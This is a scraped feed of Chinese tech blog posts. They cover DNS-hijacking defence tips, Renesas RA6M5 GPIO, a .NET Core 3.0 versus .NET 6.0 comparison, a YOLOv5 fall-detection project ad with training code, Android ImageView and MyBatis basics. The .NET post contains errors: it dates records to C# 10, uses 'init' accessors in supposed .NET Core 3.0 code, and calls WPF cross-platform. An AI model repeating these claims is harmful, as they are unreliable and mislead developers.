进入网络设置，查看DNS服务器地址是否正确。如果发现被篡改，可以手动将其修改为可靠的公共DNS服务器地址，如谷歌的 8.8.8.8 和 8.8.4.4，或者国内常用的 114.114.114.114 等。这些公共DNS服务器通常具有较高的安全性和稳定性，可以在一定程度上抵御DNS污染劫持。
其次，及时清理设备中的恶意软件至关重要
恶意软件可能是导致DNS污染劫持的 “帮手”，它们会在我们不知情的情况下修改DNS设置。使用专业的杀毒软件对设备进行全面扫描，查找并清除可能存在的恶意程序。同时，要保持杀毒软件的实时更新，以确保能够检测到最新的恶意软件。
此外，我们还可以通过修改hosts文件来应对DNS污染劫持
Hosts文件是一个本地的域名解析文件，它可以优先于DNS服务器进行域名解析。我们可以手动在hosts文件中添加正确的域名- IP地址映射关系，这样当我们访问被污染劫持的域名时，系统会首先根据hosts文件中的设置进行解析，从而绕过被篡改的DNS解析结果。不过，修改hosts文件需要谨慎操作，确保添加的信息准确无误。
如果是网站管理员发现网站被DNS污染劫持，除了采取上述措施外，还应该及时向域名注册商和网络服务提供商报告情况。如DNS综合服务提供商——帝恩思，他们通常具有更专业的技术手段和资源来处理此类问题。同时，网站管理员要加强网站的安全防护，定期更新软件和补丁，防止黑客入侵和恶意篡改。
另外，提高自身的网络安全意识也是预防和应对DNS污染劫持的关键。不随意点击来路不明的链接，不下载可疑的文件，避免访问不可信的网站。在使用公共网络时，要注意保护个人隐私和信息安全。
总之，面对DNS污染劫持，我们不能坐以待毙，要采取多种措施见招拆招。通过正确设置 DNS、清理恶意软件、修改hosts文件等方法，我们可以有效地抵御DNS污染劫持，保障自己的网络安全和正常的网络访问。同时，全社会都应该加强网络安全建设，共同营造一个安全、健康、有序的网络环境。让我们携手共进，与DNS污染劫持这一 “网络海盗” 作斗争，守护好我们的互联网家园。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540164.html</guid><pubDate>Fri, 31 Oct 2025 07:26:42 +0000</pubDate></item><item><title>RA6M5——GPIO</title><link>https://www.ppmy.cn/news/1540165.html</link><description>文章目录
GPIO输入输出
RASC图形化配置
输出模式：
输入模式：
配置选项：
接口函数
实例代码：
GPIO输入输出
RASC图形化配置
输出模式：
输入模式：
配置选项：
配置项
取值/描述
Mode
l “Input mode”（输入模式）l “Output mode(Initial Low)”（输出模式，初始电平为低）l “Output mode(Initial High)”（输出模式，初始电平为高）
Pull up（上拉电阻）
l “None”（禁止内部上拉）l “input pull-up”（使能内部上拉）当引脚被配置为Output mode时无法设置Pull up参数
IRQ（中断）
l “None”（不使用中断）l “IRQ10”（使用中断）
Output type（输出类型）
l “CMOS”l “n-ch open drain”（开漏）当引脚被配置为Input mode时无法设置本参数
Symbolic Name
#define LED (BSP_IO_PORT_04_PIN_00)
接口函数
[API详解](第5章 GPIO输入输出 | 百问网 (100ask.net))
fsp_err_t
(
*
open
)
(
ioport_ctrl_t
*
const
p_ctrl
,
const
ioport_cfg_t
*
p_cfg
)
;
fsp_err_t
(
*
close
)
(
ioport_ctrl_t
*
const
p_ctrl
)
;
fsp_err_t
(
*
pinsCfg
)
(
ioport_ctrl_t
*
const
p_ctrl
,
const
ioport_cfg_t
*
p_cfg
)
;
fsp_err_t
(
*
pinCfg
)
(
ioport_ctrl_t
*
const
p_ctrl
,
bsp_io_port_pin_t
pin
,
uint32_t
cfg
)
;
fsp_err_t
(
*
pinEventInputRead
)
(
ioport_ctrl_t
*
const
p_ctrl
,
bsp_io_port_pin_t
pin
,
bsp_io_level_t
*
p_pin_event
)
;
fsp_err_t
(
*
pinEventOutputWrite
)
(
ioport_ctrl_t
*
const
p_ctrl
,
bsp_io_port_pin_t
pin
,
bsp_io_level_t
pin_value
)
;
fsp_err_t
(
*
pinRead
)
(
ioport_ctrl_t
*
const
p_ctrl
,
bsp_io_port_pin_t
pin
,
bsp_io_level_t
*
p_pin_value
)
;
fsp_err_t
(
*
pinWrite
)
(
ioport_ctrl_t
*
const
p_ctrl
,
bsp_io_port_pin_t
pin
,
bsp_io_level_t
level
)
;
fsp_err_t
(
*
portDirectionSet
)
(
ioport_ctrl_t
*
const
p_ctrl
,
bsp_io_port_t
port
,
ioport_size_t
direction_values
,
ioport_size_t
mask
)
;
fsp_err_t
(
*
portEventInputRead
)
(
ioport_ctrl_t
*
const
p_ctrl
,
bsp_io_port_t
port
,
ioport_size_t
*
p_event_data
)
;
fsp_err_t
(
*
portEventOutputWrite
)
(
ioport_ctrl_t
*
const
p_ctrl
,
bsp_io_port_t
port
,
ioport_size_t
event_data
,
ioport_size_t
mask_value
)
;
fsp_err_t
(
*
portRead
)
(
ioport_ctrl_t
*
const
p_ctrl
,
bsp_io_port_t
port
,
ioport_size_t
*
p_port_value
)
;
fsp_err_t
(
*
portWrite
)
(
ioport_ctrl_t
*
const
p_ctrl
,
bsp_io_port_t
port
,
ioport_size_t
value
,
ioport_size_t
mask
)
;
实例代码：
/* in hal_entry() */
bsp_io_level_t
level
;
while
(
1
)
{
/* 读按键状态 */
g_ioport
.
p_api
-&gt;
pinRead
(
&amp;
g_ioport_ctrl
,
BSP_IO_PORT_00_PIN_00
,
&amp;
level
)
;
/* 根据按键状态设置LED */
g_ioport
.
p_api
-&gt;
pinWrite
(
&amp;
g_ioport_ctrl
,
BSP_IO_PORT_04_PIN_00
,
level
)
;
}</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540165.html</guid><pubDate>Fri, 31 Oct 2025 07:26:44 +0000</pubDate></item><item><title>.net core 3.0 与 6.0 有哪些不同</title><link>https://www.ppmy.cn/news/1540166.html</link><description>.NET Core 3.0 和 .NET 6.0（注意，从 .NET 5.0 开始，微软将 .NET Core 和 .NET Framework 合并为一个统一的 .NET 平台）之间有许多重要的区别。这些区别包括性能改进、新功能、API 的变化以及对不同平台的支持。下面是一些主要的区别和示例：
1. 命名和版本
.NET Core 3.0
：这是 .NET Core 的一个主要版本。
.NET 6.0
：这是 .NET 统一平台的一个主要版本，继承了 .NET Core 和 .NET Framework 的优点，并引入了许多新特性和改进。
2. 性能改进
.NET 6.0
引入了许多性能改进，特别是在 JIT 编译器、垃圾回收器和运行时优化方面。例如：
更快的启动时间。
更高效的内存使用。
改进的 AOT（Ahead-of-Time）编译支持。
3. 新功能和改进
3.1 Top-Level Statements
.NET 6.0
引入了
顶层语句
（Top-Level Statements），使得编写简单的程序更加简洁。
// .NET 6.0
using System;Console.WriteLine("Hello, World!");
而在 .NET Core 3.0 中，你需要显式地定义
Main
方法：
// .NET Core 3.0
using System;class Program
{static void Main(string[] args){Console.WriteLine("Hello, World!");}
}
3.2 C# 语言特性
.NET 6.0
随着 C# 10 的发布，引入了许多新的语言特性，如记录类型（Records）、全局 using 指令等。
// .NET 6.0 (C# 10)
global using System;
global using System.Collections.Generic;public record Person(string FirstName, string LastName);class Program
{public static void Main(){var person = new Person("John", "Doe");Console.WriteLine(person);}
}
在 .NET Core 3.0 中，你需要在每个文件中显式导入命名空间：
// .NET Core 3.0
using System;
using System.Collections.Generic;public class Person
{public string FirstName { get; init; }public string LastName { get; init; }public Person(string firstName, string lastName){FirstName = firstName;LastName = lastName;}public override string ToString(){return $"{FirstName} {LastName}";}
}class Program
{public static void Main(string[] args){var person = new Person("John", "Doe");Console.WriteLine(person);}
}
3.3 热重载（Hot Reload）
.NET 6.0
引入了热重载功能，允许你在不重启应用程序的情况下修改代码并立即看到效果。
// .NET 6.0
// 在 Visual Studio 或 VS Code 中启用热重载
// 修改代码后，应用会自动重新加载更改
3.4 Windows Forms 和 WPF 改进
.NET 6.0
对 Windows Forms 和 WPF 进行了更多的改进和支持，使其更适合跨平台开发。
// .NET 6.0
// 创建一个简单的 WPF 应用程序
&lt;Window x:Class="WpfApp.MainWindow"xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"Title="MainWindow" Height="350" Width="525"&gt;&lt;Grid&gt;&lt;TextBlock Text="Hello, WPF in .NET 6.0!" HorizontalAlignment="Center" VerticalAlignment="Center"/&gt;&lt;/Grid&gt;
&lt;/Window&gt;
而在 .NET Core 3.0 中，虽然也支持 WPF 和 Windows Forms，但功能和工具链不如 .NET 6.0 完善。
4. API 变化
.NET 6.0
引入了许多新的 API 和库，同时废弃了一些旧的 API。
例如，.NET 6.0 引入了更多现代化的 HTTP 客户端库和改进的 JSON 处理库。
// .NET 6.0
using System.Net.Http.Json;var client = new HttpClient();
var response = await client.GetFromJsonAsync&lt;WeatherForecast[]&gt;("https://localhost:5001/weatherforecast");foreach (var forecast in response)
{Console.WriteLine(forecast.Summary);
}
而在 .NET Core 3.0 中，你可能需要手动解析 JSON 数据：
// .NET Core 3.0
using System.Net.Http;
using System.Text.Json;var client = new HttpClient();
var response = await client.GetAsync("https://localhost:5001/weatherforecast");
response.EnsureSuccessStatusCode();var content = await response.Content.ReadAsStringAsync();
var forecasts = JsonSerializer.Deserialize&lt;WeatherForecast[]&gt;(content);foreach (var forecast in forecasts)
{Console.WriteLine(forecast.Summary);
}
5. 平台支持
.NET 6.0
提供了更好的跨平台支持，不仅限于 Windows，还包括 Linux 和 macOS。
.NET 6.0 还改进了对 ARM 架构的支持，特别是对 Apple Silicon 的支持。
总结
.NET Core 3.0
是一个强大的框架，但在某些方面不如 .NET 6.0 先进。
.NET 6.0
引入了许多新特性、性能改进和工具，使得开发更加高效和便捷。
如果你正在开始一个新的项目，强烈建议使用 .NET 6.0 或更高版本，以充分利用最新的技术和改进。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540166.html</guid><pubDate>Fri, 31 Oct 2025 07:26:47 +0000</pubDate></item><item><title>人员跌倒检测系统的设计与实现（Yolov Python38 深度学习）+文档</title><link>https://www.ppmy.cn/news/1540167.html</link><description>💗博主介绍💗：✌在职Java研发工程师、专注于
程序设计、源码分享、技术交流、专注于Java技术领域和毕业设计
✌
温馨提示：文末有 CSDN 平台官方提供的老师 Wechat / QQ 名片 :)
Java精品实战案例《700套》
2025最新毕业设计选题推荐：最热的500个选题o(￣▽￣)ｄ
介绍
人员跌倒检测系统在社会安防和医疗卫生领域扮演着关键的角色。随着老年人口的不断增加，跌倒事故对健康和生活质量的威胁日益突出。因此，设计一种可靠、高效的人员跌倒检测系统成为当前科技研究的迫切需求。本研究针对这一需求，以Android平台为基础，致力于打造一款具备实时性、灵活性和准确性的人员跌倒检测系统。
在考虑手机计算资源有限的前提下，采用了轻量化的YOLOv5模型，以适应移动设备的性能限制，提高检测准确性。系统提供了多种检测模式，包括基于图片、视频和实时摄像头的跌倒检测，使用户能够根据需求选择不同的检测方式和模型配置。该设计既满足了安全监控的需求，又为医疗机构提供了一种实用的跌倒事件辅助检测工具。
关键词：人员跌倒检测；Android平台；深度学习模型；移动端应用
演示视频
人员跌倒检测系统的设计与实现（Yolov Python38 深度学习）_哔哩哔哩_bilibili
系统功能
3.3 系统流程的分析
3.3.1 模型训练流程
模型训练流程包括数据准备、模型选择、训练配置、模型训练、验证和优化等关键步骤。首先，收集丰富的视频数据集并进行标注，以供模型训练使用。然后，选择适当的深度学习模型，如基于YOLOv5的优化模型，具有高效的目标检测能力。接着，设置训练参数，并将数据集输入模型进行训练。随后，使用验证集评估模型性能，并根据结果进行调整和优化。最后，保存训练好的模型，以备在实际应用中进行推理。
3.3.2 Android端部署集成流程
利用脚本将PyTorch YOLOv5模型导出为ONNX格式，并使用onnx-simplifier工具简化网络结构以提高模型在Android上的效率。然后，利用TNN转换工具将ONNX模型转换为TNN模型，确保在Android端的兼容性和正确性。在Android Studio中配置开发环境，导入TNN模型和相关库，并通过C++实现的YOLOv5核心算法进行模型推理。最后，根据模型输入大小和锚点信息进行参数设置，并解决可能出现的异常错误，确保模型在Android上准确运行。
3.4 系统性能需求分析
轻量化的YOLOv5s05模型在普通Android手机上表现出良好的性能。通过降低计算量和参数量，该模型在实现实时检测方面取得了显著进展。尽管相对于原始模型可能存在轻微的精度损失，但在实际业务中，仍能保持合理的检测精度。在手机上，该模型的CPU和GPU推理速度约为30ms和25ms，确保了实时检测的需求。综上所述，轻量化的YOLOv5s05模型在满足业务需求的同时，有效地平衡了性能和效率。
系统截图
可行性分析
3.1.1  技术可行性
本研究基于深度学习方法，特别是以轻量化的YOLOv5模型为基础，通过在Android平台上进行移植和优化，实现了在移动端设备上进行人员跌倒检测。深度学习方法在跌倒检测领域已取得显著成果，具备强大的特征学习和模式建模能力。YOLOv5模型以其高效的目标检测能力而备受关注。在Android平台的可行性方面，已有一系列研究致力于深度学习模型的移植、实时性能的优化以及用户友好的应用设计。通过轻量化模型的研究，研究者们有效克服了移动设备有限的计算资源和存储空间限制。综合考虑，本研究在技术可行性上具备坚实基础，为在移动端实现高效人员跌倒检测提供了有力支持。
3.1.2  经济可行性
本研究在经济可行性上具有潜在的价值。随着老龄化社会的到来，人员跌倒检测技术在保障老年人生活安全方面具备广阔市场需求。该技术的应用范围涵盖医疗机构、养老院以及个人居家等多个场景，为用户提供及时的安全监测和应急响应。由于跌倒事故可能导致严重后果，预防与及时干预具有显著的社会和经济效益。在经济层面，该技术可降低医疗和护理成本，减轻家庭和社会的养老负担。同时，作为移动端应用，该系统的低成本部署和维护也为其经济可行性提供了优势。综合而言，本研究在满足实际需求的同时，具备潜在的经济回报，为推动人员跌倒检测技术在市场上的应用奠定了经济可行性基础。
3.1.3  操作可行性
本研究的人员跌倒检测系统在操作可行性上具备显著优势。首先，采用深度学习方法，特别是基于轻量化的YOLOv5模型，使系统在移动端设备上运行更为高效。其次，系统在Android平台上的实现考虑了用户友好性，通过直观的界面设计和灵活的配置选项，使用户能够轻松使用和管理。此外，移动端的灵活性和便携性使得系统部署简便，用户能够随时随地进行跌倒检测，增强了操作的便捷性。
国内外研究现状
1.3.1  国内研究现状
在国内，随着人口老龄化问题日益突出，基于深度学习的人员跌倒检测系统得到了广泛关注和研究。目前，研究者们主要集中在深度学习模型的优化和适用性方面进行探索。许多学者通过引入不同的神经网络结构和算法，致力于提高检测系统的准确性和实时性。[7]
研究者们还在数据集的构建和模型训练方面做出努力。通过收集丰富的跌倒和非跌倒数据，一些研究团队致力于提高模型的泛化能力，以适应不同环境和人群的监测需求。这种以数据为基础的研究在保证模型稳定性和可靠性方面发挥着关键作用。[8]
1.3.2  国外研究现状
在国外，人员跌倒检测系统的研究取得了显著的进展，吸引了全球范围内研究者的广泛关注。国外的研究主要体现在深度学习模型的创新和应用领域。近年来，研究者们通过引入更复杂的神经网络结构和先进的训练技术，不断提升人员跌倒检测系统的性能和智能化水平。[9]
国外的研究还注重在大规模真实场景下的验证和应用。一些研究团队通过与医疗机构和养老院等合作，将其研究成果应用到实际生活中，检测系统在真实场景中的效果和可行性得到了验证。这种将研究成果与实际需求相结合的方法为人员跌倒检测技术的实际应用提供了有力支持。[10]
功能代码
import argparse
import logging
import os
import random
import sys
import time
from copy import deepcopy
from pathlib import Pathimport math
import numpy as np
import torch
import torch.distributed as dist
import torch.nn as nn
import yaml
from torch.cuda import amp
from torch.nn.parallel import DistributedDataParallel as DDP
from torch.optim import Adam, SGD, lr_scheduler
from tqdm import tqdmFILE = Path(__file__).absolute()
sys.path.append(FILE.parents[0].as_posix())  # add yolov5/ to pathimport val  # for end-of-epoch mAP
from models.experimental import attempt_load
from models.yolo import Model
from utils.autoanchor import check_anchors
from utils.datasets import create_dataloader
from utils.general import labels_to_class_weights, increment_path, labels_to_image_weights, init_seeds, \strip_optimizer, get_latest_run, check_dataset, check_file, check_git_status, check_img_size, \check_requirements, print_mutation, set_logging, one_cycle, colorstr, methods
from utils.downloads import attempt_download
from utils.loss import ComputeLoss
from utils.plots import plot_labels, plot_evolve
from utils.torch_utils import ModelEMA, select_device, intersect_dicts, torch_distributed_zero_first, de_parallel
from utils.loggers.wandb.wandb_utils import check_wandb_resume
from utils.metrics import fitness
from utils.loggers import Loggers
from utils.callbacks import CallbacksLOGGER = logging.getLogger(__name__)
LOCAL_RANK = int(os.getenv('LOCAL_RANK', -1))  # https://pytorch.org/docs/stable/elastic/run.html
RANK = int(os.getenv('RANK', -1))
WORLD_SIZE = int(os.getenv('WORLD_SIZE', 1))def train(hyp,  # path/to/hyp.yaml or hyp dictionaryopt,device,callbacks=Callbacks()):save_dir, epochs, batch_size, weights, single_cls, evolve, data, cfg, resume, noval, nosave, workers, freeze, = \Path(opt.save_dir), opt.epochs, opt.batch_size, opt.weights, opt.single_cls, opt.evolve, opt.data, opt.cfg, \opt.resume, opt.noval, opt.nosave, opt.workers, opt.freeze# Directoriesw = save_dir / 'weights'  # weights dirw.mkdir(parents=True, exist_ok=True)  # make dirlast, best = w / 'last.pt', w / 'best.pt'# Hyperparametersif isinstance(hyp, str):with open(hyp) as f:hyp = yaml.safe_load(f)  # load hyps dictLOGGER.info(colorstr('hyperparameters: ') + ', '.join(f'{k}={v}' for k, v in hyp.items()))# Save run settingswith open(save_dir / 'hyp.yaml', 'w') as f:yaml.safe_dump(hyp, f, sort_keys=False)with open(save_dir / 'opt.yaml', 'w') as f:yaml.safe_dump(vars(opt), f, sort_keys=False)data_dict = None# Loggersif RANK in [-1, 0]:loggers = Loggers(save_dir, weights, opt, hyp, LOGGER)  # loggers instanceif loggers.wandb:data_dict = loggers.wandb.data_dictif resume:weights, epochs, hyp = opt.weights, opt.epochs, opt.hyp# Register actionsfor k in methods(loggers):callbacks.register_action(k, callback=getattr(loggers, k))# Configplots = not evolve  # create plotscuda = device.type != 'cpu'init_seeds(1 + RANK)with torch_distributed_zero_first(RANK):data_dict = data_dict or check_dataset(data, use_polyaxon=opt.polyaxon)  # check if Nonetrain_path, val_path = data_dict['train'], data_dict['val']names = ['item'] if single_cls and len(data_dict['names']) != 1 else data_dict['names']  # class namesif int(data_dict['nc']) &lt; 0:  data_dict['nc'] = len(names)nc = 1 if single_cls else int(data_dict['nc'])  # number of classes# assert len(names) == nc, f'{len(names)} names found for nc={nc} dataset in {data}'  # checkis_coco = data.endswith('coco.yaml') and nc == 80  # COCO dataset# Modelpretrained = weights.endswith('.pt')if pretrained:with torch_distributed_zero_first(RANK):weights = attempt_download(weights)  # download if not found locallyckpt = torch.load(weights, map_location=device)  # load checkpointmodel = Model(cfg or ckpt['model'].yaml, ch=3, nc=nc, anchors=hyp.get('anchors'), imgsz=opt.imgsz).to(device)  # createexclude = ['anchor'] if (cfg or hyp.get('anchors')) and not resume else []  # exclude keyscsd = ckpt['model'].float().state_dict()  # checkpoint state_dict as FP32csd = intersect_dicts(csd, model.state_dict(), exclude=exclude)  # intersectmodel.load_state_dict(csd, strict=False)  # loadLOGGER.info(f'Transferred {len(csd)}/{len(model.state_dict())} items from {weights}')  # reportelse:model = Model(cfg, ch=3, nc=nc, anchors=hyp.get('anchors'), imgsz=opt.imgsz).to(device)  # createLOGGER.info("model anchor:{}".format(model.yaml["anchors"]))# Freezefreeze = [f'model.{x}.' for x in range(freeze)]  # layers to freezefor k, v in model.named_parameters():v.requires_grad = True  # train all layersif any(x in k for x in freeze):print(f'freezing {k}')v.requires_grad = False# Optimizernbs = 64  # nominal batch sizeaccumulate = max(round(nbs / batch_size), 1)  # accumulate loss before optimizinghyp['weight_decay'] *= batch_size * accumulate / nbs  # scale weight_decayLOGGER.info(f"Scaled weight_decay = {hyp['weight_decay']}")g0, g1, g2 = [], [], []  # optimizer parameter groupsfor v in model.modules():if hasattr(v, 'bias') and isinstance(v.bias, nn.Parameter):  # biasg2.append(v.bias)if isinstance(v, nn.BatchNorm2d):  # weight (no decay)g0.append(v.weight)elif hasattr(v, 'weight') and isinstance(v.weight, nn.Parameter):  # weight (with decay)g1.append(v.weight)if opt.adam:optimizer = Adam(g0, lr=hyp['lr0'], betas=(hyp['momentum'], 0.999))  # adjust beta1 to momentumelse:optimizer = SGD(g0, lr=hyp['lr0'], momentum=hyp['momentum'], nesterov=True)optimizer.add_param_group({'params': g1, 'weight_decay': hyp['weight_decay']})  # add g1 with weight_decayoptimizer.add_param_group({'params': g2})  # add g2 (biases)LOGGER.info(f"{colorstr('optimizer:')} {type(optimizer).__name__} with parameter groups "f"{len(g0)} weight, {len(g1)} weight (no decay), {len(g2)} bias")del g0, g1, g2# Schedulerif opt.linear_lr:lf = lambda x: (1 - x / (epochs - 1)) * (1.0 - hyp['lrf']) + hyp['lrf']  # linearelse:lf = one_cycle(1, hyp['lrf'], epochs)  # cosine 1-&gt;hyp['lrf']scheduler = lr_scheduler.LambdaLR(optimizer, lr_lambda=lf)  # plot_lr_scheduler(optimizer, scheduler, epochs)# EMAema = ModelEMA(model) if RANK in [-1, 0] else None
文章下方名片联系我即可~
大家点赞、收藏、关注、评论啦 、
查看
👇🏻
获取联系方式
👇🏻</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540167.html</guid><pubDate>Fri, 31 Oct 2025 07:26:48 +0000</pubDate></item><item><title>Android常用界面控件——ImageView</title><link>https://www.ppmy.cn/news/1540168.html</link><description>目录
1 ImageView
1.1在XML 中定义ImageView：
1.1.1 ImageView常用XML属性
1.1.2 ImageView ScaleType用法
1.2 在Java代码中控制ProgressBar：
1.3 区别总结
1.3.1 应用场景选择建议
1 ImageView
ImageView，图像视图，直接继承自View类，它的主要功能是用于显示图片，实际上它不仅仅可以用来显示图片，任何Drawable对象都可以使用ImageView来显示。ImageView 可以显示不同类型的图片，包括本地图片、加载网络图片或者通过代码生成的图片。ImageView可以适用于任何布局中，并且Android为其提供了缩放和着色的一些操作。
ImageView 是Android中常用的界面控件之一，它用于显示图片或者其他图形。ImageView 可以显示不同类型的图片，包括本地图片、加载网络图片或者通过代码生成的图片。
使用 ImageView 需要以下几个步骤：
在 XML 布局文件中，使用
&lt;ImageView&gt;
标签来定义 ImageView 控件，可以通过设置宽高、位置等属性来调整其显示效果。
在 Java 代码中，通过
findViewById()
方法获取到 ImageView 控件的引用。
使用
setImageResource()
方法设置 ImageView 的图片资源。可以是一个 drawable 文件，如
R.drawable.image
，也可以是一个网络图片的 URL。
也可以使用
setScaleType()
方法来设置图片的缩放类型，常用的有 CENTER_INSIDE、CENTER_CROP、FIT_CENTER 等。
最后，将 ImageView 添加到界面的相应位置，如布局容器或者其他视图中，通过调用容器的
addView()
方法实现。
1.1在XML 中定义ImageView：
&lt;ImageViewandroid:id="@+id/imageView"android:layout_width="200dp"android:layout_height="200dp"android:scaleType="fitCenter"android:src="@drawable/image" /&gt;
简单定义ImageView 控件的宽高为200dp，图片资源为 drawable 目录下的 image 文件，并且图片的缩放类型为 FIT_CENTER 。
1.1.1 ImageView常用XML属性
android:src                    //设置显示的图片，导入格式为：文件夹名/图片名
android:background             //设置背景样式（同其他控件类似）
android:maxHeight              //设置显示图片的的最大高度
android:maxWidth               //设置显示图片的最大宽度
android:tint                   //设置显示图片的色彩
android:scaleType              //调整图片缩放、位置等以满足图片显示的需要
android:adjustViewBounds       //是否保持宽高比 需与maxWidth、MaxHeight一起使用，单独使用无效果
1.1.2 ImageView ScaleType用法
详细介绍跳转： ImageView的ScaleType原理及效果分析 - 简书 (jianshu.com)
1.2 在Java代码中控制ProgressBar：
ImageView imageView = findViewById(R.id.imageView);
imageView.setImageResource(R.drawable.image);
imageView.setScaleType(ImageView.ScaleType.FIT_CENTER);
1.3 区别总结
XML方式
属性直接定义在XML文件中。
适合静态配置。
更易于维护和理解，特别是在查看布局文件时。
Java方式
属性通过代码设置。
支持动态更改。
提供了更多的灵活性，适用于需要在运行时改变属性的情况。
具体在示例中：
XML布局文件中，
ImageView
的
scaleType
被设置为
fitCenter
，并且图片资源在
android:src
属性中指定。
Java代码中，通过
setScaleType
方法设置了
ImageView
的
scaleType
属性，并通过
setImageResource
方法指定了图片资源。
这两种方式最终的效果是一样的，即
ImageView
将以
fitCenter
的方式显示图片资源
@drawable/image
。但是，它们的应用场景和适用性有所不同。
1.3.1 应用场景选择建议
如果知道图片在所有情况下都应该以某种特定的方式显示，并且这种设置不会改变，那么使用XML布局文件定义属性更为合适。
如果需要根据运行时的条件或用户交互来改变
ImageView
的行为（如切换图片或改变缩放类型），则使用Java代码设置属性会更加灵活。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540168.html</guid><pubDate>Fri, 31 Oct 2025 07:26:50 +0000</pubDate></item><item><title>MyBatis的详细大全，结合项目(Day35)</title><link>https://www.ppmy.cn/news/1540169.html</link><description>1 学习目标
了解MyBatis的介绍和历史
重点掌握
SpringBoot整合MyBatis
重点掌握
MyBatis基于注解方式
重点掌握
MyBatis基于XML方式
2 MyBatis介绍
MyBatis 是支持定制化 SQL、存储过程以及高级映射的优秀的持久层框架。
MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。
MyBatis可以使用简单的XML或注解用于配置和原始映射，将接口和Java的POJO（Plain Old Java Objects，普通的Java对象）映射成数据库中的记录.
3 MyBatis的历史
原是Apache的一个开源项目
iBatis
, 该项目最初由Clinton Begin创建。2005年，该项目被提交到了Apache Software Foundation。但是由于名称与IBM拥有的商标iSeries和DB2的i系列冲突，因此项目名称与2010年被更改为MyBatis。
4 SpringBoot整合MyBatis
4.1 项目准备
①在JSDSecondStage项目下,创建
MyBatisDemo
模块,并指定版本号为2.5.4
②为项目添加相关依赖
注意
: 无需引入spring对jdbc的驱动,因为MyBatis会自动引入
&lt;!--mysql数据库驱动依赖--&gt;
&lt;dependency&gt;&lt;groupId&gt;mysql&lt;/groupId&gt;&lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;&lt;scope&gt;runtime&lt;/scope&gt;
&lt;/dependency&gt;
&lt;!--引入相关mybatis依赖--&gt;
&lt;dependency&gt;&lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt;&lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt;&lt;version&gt;2.2.0&lt;/version&gt;
&lt;/dependency&gt;
4.2 配置数据源
在application.yml文件中设置基础配置
#设置连接数据库的url、username、password，这三部分不能省略
spring:datasource:url: jdbc:mysql://localhost:3306/hr?serverTimezone=Asia/Shanghai&amp;characterEncoding=utf8username: rootpassword: root
5 MyBatis基于注解方式
5.1 编写实体类
ORM(Object Relational Mapping)
：对象关系映射,指的是持久化数据和实体对象的映射模式，为了解决面向对象与关系型数据库存在的互不匹配的现象的技术。其具体的映射规则是:一张表对应一个类，表中的各个字段对应类中的属性，表中的一条数据对应类的一个对象
MyBatis可以自动将查询的结果与对应实体类映射,所以需要准备与查询的表相关联的实体类,需要注意的是,实体类的属性需要和表字段保持一致
由于此处我们的入门案例是查询locations表,所以创建Locations类,并在该类中声明与locations表字段相同的属性(属性声明时,最好开启驼峰规则)
①**
Locations
**
public class Locations {private Integer locationId;private String streetAddress;private String postalCode;private String city;private String stateProvince;private String countryId;public Integer getLocationId() {return locationId;}public void setLocationId(Integer locationId) {this.locationId = locationId;}public String getStreetAddress() {return streetAddress;}public void setStreetAddress(String streetAddress) {this.streetAddress = streetAddress;}public String getPostalCode() {return postalCode;}public void setPostalCode(String postalCode) {this.postalCode = postalCode;}public String getCity() {return city;}public void setCity(String city) {this.city = city;}public String getStateProvince() {return stateProvince;}public void setStateProvince(String stateProvince) {this.stateProvince = stateProvince;}public String getCountryId() {return countryId;}public void setCountryId(String countryId) {this.countryId = countryId;}@Overridepublic String toString() {return "Locations{" +"locationId=" + locationId +", streetAddress='" + streetAddress + '\'' +", postalCode='" + postalCode + '\'' +", city='" + city + '\'' +", stateProvince='" + stateProvince + '\'' +", countryId='" + countryId + '\'' +'}';}
}
5.2 定义接口和方法
MyBatis需要准备一个接口类,作为Mapper,该接口中的每一个方法可以绑定一条SQL,实现调用接口方法即可调用SQL的功能
在 MyBatis 中，Mapper 接口的命名一般要遵循一定的规范，以便于开发人员理解和维护代码。以下是一些常用的命名规范：
Mapper 接口的名称应该与对应的 SQL 语句相对应，可以根据表名或者业务功能命名，比如 UserMapper、OrderMapper 等。
Mapper 接口的方法名应该能够清晰地表示这个方法所执行的 SQL 语句，一般可以使用动词加上表名或者业务功能的方式来命名，比如 addUser、updateOrder 等。
Mapper 接口中的方法参数名应该与 SQL 语句中的参数名相对应，这样可以提高代码的可读性和可维护性。
①**
LocationsMapper
**
//指定这是一个操作数据库的mapper
@Mapper
public interface LocationsMapper {@Select("SELECT * FROM locations")public List&lt;Locations&gt; getLocationsAll();
}
②**
TestMyBatisAnno
**
/*** 用于测试基于MyBatis注解开发的入门案例*/
@SpringBootTest
public class TestMyBatisAnno {@Autowiredprivate LocationsMapper locationsMapper;@Testpublic void testGetLocationsAll() {List&lt;Locations&gt; locationsAll = locationsMapper.getLocationsAll();for (Locations locations : locationsAll) {System.out.println(locations);}}
}
③**
application.yml开启驼峰规则
**
#开启驼峰规则
mybatis:configuration:map-underscore-to-camel-case: true
5.3 测试增删改查
①**
LocationsMapper
**
//指定这是一个操作数据库的mapper
@Mapper
public interface LocationsMapper {@Select("SELECT * FROM locations")public List&lt;Locations&gt; getLocationsAll();@Insert("INSERT INTO locations values(6666,'TEST','TEST','TEST','TEST','MX')")public int addLocations();@Update("UPDATE locations SET city='BEIJING' WHERE location_id = 6666")public int updateLocations();@Delete("DELETE FROM locations WHERE location_id = 6666")public int deleteLocations();
}
②**
TestMyBatisAnno
**
/*** 用于测试基于MyBatis注解开发的入门案例*/
@SpringBootTest
